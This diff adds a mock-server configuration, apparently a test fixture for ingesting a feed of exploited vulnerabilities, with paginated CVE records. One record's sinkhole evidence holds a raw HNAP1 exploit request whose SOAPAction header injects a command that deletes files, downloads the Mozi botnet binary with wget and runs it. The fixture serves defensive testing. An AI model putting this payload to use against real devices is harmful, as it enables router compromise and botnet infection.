@@ -1,0 +1,77 @@
+rules:
+  # Round 2 — cursor-persisted resume. Matches any date_from value the CEL
+  # program derives from the persisted bookmark. Returns one new assertion on
+  # the first request and an empty page afterwards, so hit_count stays
+  # deterministic across the short polling interval used by the system test.
+  # Placed first so it wins over the unfiltered round 1 rules below.
+  - path: /api/kev/
+    methods: ['GET']
+    query_params:
+      page: '1'
+      per_page: '2'
+      date_from: '{date_from:.*}'
+    responses:
+      - status_code: 200
+        headers:
+          Content-Type:
+            - 'application/json'
+        body: |-
+          {{ if eq .req_num 1 -}}
+          {"metadata":{"count":1,"page":1,"per_page":2},"data":[{"uuid":"6e5a9b13-2c84-4d7f-9e10-3a6c5f28b704","vulnerability":{"vulnId":"CVE-2025-20282","altId":[]},"gcve":{"origin_uuid":"7a1c4e6b-0d92-4f38-b5a7-2c8e6d04b915","gna":1,"object_uuid":"6e5a9b13-2c84-4d7f-9e10-3a6c5f28b704"},"status":{"exploited":true,"status_reason":"confirmed","status_updated_at":"2026-08-07T09:10:58+00:00"},"timestamps":{"asserted_at":"2026-08-07T09:10:58+00:00","recorded_at":"2026-08-07T10:00:01+00:00","first_seen_at":"2026-08-07T09:10:58+00:00"},"scope":{"notes":"Cisco ISE API Unauthenticated Remote Code Execution Vulnerability | Affected: Cisco / Cisco Identity Services Engine Software | CVSS: 10.0 (CRITICAL) | EPSS: 0.26516 | Used in malware: unknown | Not yet in CISA KEV: True"},"evidence":[{"type":"public_report","source":"kevintel","signal":"successful_exploitation","confidence":0.7,"details":{"feed":"KEVIntel (kevintel.com)","title":"Cisco ISE API Unauthenticated Remote Code Execution Vulnerability","vendor":"Cisco","product":"Cisco Identity Services Engine Software","added_date":"2026-08-07T09:10:58.086Z","cvss_score":10.0,"epss_score":0.26516,"cvss_severity":"CRITICAL","epss_percentile":0.97818,"used_in_malware":"unknown","ahead_of_cisa_kev":null,"not_yet_in_cisa_kev":true}}],"references":[{"id":"CVE-2025-20282","url":"https://www.cve.org/CVERecord?id=CVE-2025-20282"},{"id":"kevintel","url":"https://kevintel.com/CVE-2025-20282"}]}]}
+          {{- else -}}
+          {"metadata":{"count":1,"page":1,"per_page":2},"data":[]}
+          {{- end }}
+  # Round 1 page 1 — full catalog backfill, no date_from. Non-terminal:
+  # page * per_page (2) < metadata.count (5).
+  - path: /api/kev/
+    methods: ['GET']
+    query_params:
+      page: '1'
+      per_page: '2'
+    responses:
+      - status_code: 200
+        headers:
+          Content-Type:
+            - 'application/json'
+        body: |-
+          {"metadata":{"count":5,"page":1,"per_page":2},"data":[{"uuid":"1f0b7c42-3a5d-4e18-9b26-0c7d5e8a41f3","vulnerability":{"vulnId":"CVE-2026-55450","altId":[]},"gcve":{"origin_uuid":"7a1c4e6b-0d92-4f38-b5a7-2c8e6d04b915","gna":1,"object_uuid":"1f0b7c42-3a5d-4e18-9b26-0c7d5e8a41f3"},"status":{"exploited":true,"status_reason":"confirmed","status_updated_at":"2026-08-09T12:09:32+00:00"},"timestamps":{"asserted_at":"2026-08-09T12:09:32+00:00","recorded_at":"2026-08-09T14:00:01+00:00","first_seen_at":"2026-08-09T12:09:32+00:00"},"scope":{"notes":"Langflow: Unauthenticated file upload leads to DoS (space exhaustion) and information leak | Affected: langflow-ai / langflow | CVSS: 9.3 (CRITICAL) | EPSS: 0.11819 | Used in malware: unknown | Not yet in CISA KEV: True"},"evidence":[{"type":"public_report","source":"kevintel","signal":"successful_exploitation","confidence":0.7,"details":{"feed":"KEVIntel (kevintel.com)","title":"Langflow: Unauthenticated file upload leads to DoS (space exhaustion) and information leak","vendor":"langflow-ai","product":"langflow","added_date":"2026-08-09T12:09:32.943Z","cvss_score":9.3,"epss_score":0.11819,"cvss_severity":"CRITICAL","epss_percentile":0.95685,"used_in_malware":"unknown","ahead_of_cisa_kev":null,"not_yet_in_cisa_kev":true}}],"references":[{"id":"CVE-2026-55450","url":"https://www.cve.org/CVERecord?id=CVE-2026-55450"},{"id":"kevintel","url":"https://kevintel.com/CVE-2026-55450"}]},{"uuid":"2c9e4d71-8b03-4f5a-a1d6-7e2b9c04f85d","vulnerability":{"vulnId":"CVE-2026-8037","altId":[]},"gcve":{"origin_uuid":"8b2d5f7c-1e03-4a49-9c6b-3d7f0e21a846","gna":1,"object_uuid":"2c9e4d71-8b03-4f5a-a1d6-7e2b9c04f85d"},"status":{"exploited":true,"status_reason":"confirmed","status_updated_at":"2026-08-07T00:00:00+00:00"},"timestamps":{"asserted_at":"2026-08-07T00:00:00+00:00","recorded_at":"2026-08-07T18:00:01+00:00","first_seen_at":"2026-08-07T00:00:00+00:00"},"scope":{"notes":"Progress LoadMaster Command Injection Vulnerability | Affected: Progress / LoadMaster | Description: Progress LoadMaster contains a command injection vulnerability that allows an un-authenticated attacker to execute arbitrary commands on the LoadMaster appliance by exploiting unsanitized input in multiple command endpoints. | Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA's BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance. | Due date: 2026-08-10 | Known ransomware campaign use (KEV): Unknown | Notes (KEV): https://community.progress.com/s/article/LoadMaster-Critical-Security-Bulletin ; https://nvd.nist.gov/vuln/detail/CVE-2026-8037"},"evidence":[{"type":"vendor_report","source":"cisa-kev","signal":"successful_exploitation","confidence":0.8,"details":{"cwes":["CWE-77"],"feed":"CISA Known Exploited Vulnerabilities Catalog","product":"LoadMaster","due_date":"2026-08-10","date_added":"2026-08-07","vendorProject":"Progress","vulnerabilityName":"Progress LoadMaster Command Injection Vulnerability","knownRansomwareCampaignUse":"Unknown"}}],"references":[{"id":"CVE-2026-8037","url":"https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-8037"}]}]}
+  # Round 1 page 2 — non-terminal: 2 * 2 < 5.
+  - path: /api/kev/
+    methods: ['GET']
+    query_params:
+      page: '2'
+      per_page: '2'
+    responses:
+      - status_code: 200
+        headers:
+          Content-Type:
+            - 'application/json'
+        body: |-
+          {"metadata":{"count":5,"page":2,"per_page":2},"data":[{"uuid":"3a6d1e58-4c72-49b8-8f03-5d1a6b9e2c47","vulnerability":{"vulnId":"CVE-2026-2652","altId":[]},"gcve":{"origin_uuid":"9c3e6a1d-2f14-4b5a-8d7e-4e81c2f90b37","gna":1,"object_uuid":"3a6d1e58-4c72-49b8-8f03-5d1a6b9e2c47"},"status":{"exploited":true,"status_reason":"confirmed","status_updated_at":"2026-08-07T16:02:51+00:00"},"characteristics":{"severity":86},"timestamps":{"asserted_at":"2026-08-07T16:02:51+00:00","recorded_at":"2026-08-09T01:00:02+00:00","last_seen_at":"2026-08-07T16:02:51+00:00","first_seen_at":"2026-08-07T16:02:51+00:00"},"scope":{"notes":"Affected: MLflow / MLflow | Class: ai-system | Severity: High (CVSS 8.6) | IoT: no | In CISA KEV: no | Honeypot connections on 2026-08-07: 3","asset_exposure":["internet-facing"]},"evidence":[{"type":"honeypot","source":"shadowserver","signal":"in_the_wild_attempts","confidence":0.7,"details":{"1d":"2","iot":"no","feed":"Shadowserver Foundation honeypot/exploited-vulnerabilities","type":"http-scan","class":"ai-system","7d_avg":0,"vendor":"MLflow","30d_avg":0,"90d_avg":0,"product":"MLflow","cisa_kev":"no","connections":3,"observation_date":"2026-08-07","vulnerability_class":"CVSS","vulnerability_score":8.6,"vulnerability_severity":"High"}}],"references":[{"id":"CVE-2026-2652","url":"https://www.cve.org/CVERecord?id=CVE-2026-2652"},{"id":"shadowserver","url":"https://www.shadowserver.org/what-we-do/network-reporting/honeypot-exploited-vulnerabilities-report/"}]},{"uuid":"4b8f2a90-6d15-4c3e-b7a2-9e04c1d85f36","vulnerability":{"vulnId":"CVE-2025-59719","altId":[]},"gcve":{"origin_uuid":"0d4f7b2e-3a25-4c6b-9e8f-5f92d3a01c48","gna":1,"object_uuid":"4b8f2a90-6d15-4c3e-b7a2-9e04c1d85f36"},"status":{"exploited":true,"status_reason":"confirmed","status_updated_at":"2026-01-27T00:00:00+00:00"},"timestamps":{"asserted_at":"2026-01-27T00:00:00+00:00","recorded_at":"2026-06-05T16:57:54+00:00","first_seen_at":"2026-01-27T00:00:00+00:00"},"scope":{"notes":"Affected: Fortinet / Fortiweb | Description: An improper verification of cryptographic signature vulnerability in Fortinet FortiWeb may allow an unauthenticated attacker to bypass the FortiCloud SSO login authentication via a crafted SAML response message. | Threat actors: unknown | Origin source: CERT-AT | Notes: https://www.cert.at/en/blog/2026/1/threat-actors-use-forticloud-to-collect-ldap-connection-passwords"},"evidence":[{"type":"csirt_report","source":"enisa-cnw-kev","signal":"successful_exploitation","confidence":0.75,"details":{"cwes":"-","euvd":"EUVD-2025-202191","notes":"https://www.cert.at/en/blog/2026/1/threat-actors-use-forticloud-to-collect-ldap-connection-passwords","catalog":"ENISA / EU CSIRTs Network (CNW) KEV JSON","product":"Fortiweb","dateReported":"2026/01/27","originSource":"CERT-AT","vendorProject":"Fortinet","exploitationType":"-","vulnerabilityName":"-","threatActorsExploiting":"unknown"}}],"references":[{"id":"CVE-2025-59719","url":"https://www.cve.org/CVERecord?id=CVE-2025-59719"},{"id":"EUVD-2025-202191","url":"https://euvd.enisa.europa.eu/vulnerability/EUVD-2025-202191"}]}]}
+  # Round 1 page 3 — terminal page: 3 * 2 >= 5 stops want_more. Carries the
+  # locally authored, note-only evidence shape.
+  - path: /api/kev/
+    methods: ['GET']
+    query_params:
+      page: '3'
+      per_page: '2'
+    responses:
+      - status_code: 200
+        headers:
+          Content-Type:
+            - 'application/json'
+        body: |-
+          {"metadata":{"count":5,"page":3,"per_page":2},"data":[{"uuid":"5d3c8e07-9f41-4a26-8c5b-1b7e0a94d652","vulnerability":{"vulnId":"CVE-2024-13030","altId":[]},"gcve":{"origin_uuid":"1e5a8c3f-4b36-4d7c-af90-60a3e4b12d59","gna":1,"object_uuid":"5d3c8e07-9f41-4a26-8c5b-1b7e0a94d652"},"status":{"exploited":true,"status_reason":"suspected","status_updated_at":"2026-03-12T10:49:58+00:00"},"characteristics":{"severity":100.0,"local_access_required":false,"remote_code_execution":true,"authentication_required":false},"timestamps":{"asserted_at":"2026-03-12T10:49:58+00:00","last_seen_at":"2026-03-12T10:49:58+00:00","first_seen_at":"2026-03-12T10:49:58+00:00"},"evidence":[{"type":"sinkhole","source":"cti-feed.example.com","signal":"in_the_wild_attempts","confidence":1.0,"details":{"note":"POST /HNAP1/ HTTP/1.0\r\nHost: 198.51.100.10:80\r\nContent-Type: text/xml; charset=\"utf-8\"\r\nSOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://203.0.113.20:51387/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`\r\nContent-Length: 640\r\n\r\n<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope><soap:Body><AddPortMapping xmlns=\"http://purenetworks.com/HNAP1/\"><InternalClient>192.0.2.30</InternalClient><PortMappingProtocol>TCP</PortMappingProtocol><ExternalPort>1234</ExternalPort></AddPortMapping></soap:Body></soap:Envelope>"}}]}]}
+  # Regression guard — any /api/kev/ request that does not match the flow above
+  # (for example a cleared cursor re-requesting an already-walked page, or an
+  # unexpected parameter set) returns an extra synthetic assertion so the
+  # system test fails on hit_count rather than passing silently.
+  - path: /api/kev/
+    methods: ['GET']
+    responses:
+      - status_code: 200
+        headers:
+          Content-Type:
+            - 'application/json'
+        body: |-
+          {"metadata":{"count":1,"page":1,"per_page":2},"data":[{"uuid":"00000000-0000-4000-8000-000000000001","vulnerability":{"vulnId":"CVE-1999-0001","altId":[]},"gcve":{"origin_uuid":"1e5a8c3f-4b36-4d7c-af90-60a3e4b12d59","gna":1,"object_uuid":"00000000-0000-4000-8000-000000000001"},"status":{"exploited":true,"status_reason":"unknown","status_updated_at":"1999-01-01T00:00:00+00:00"},"timestamps":{"first_seen_at":"1999-01-01T00:00:00+00:00"},"evidence":[]}]}
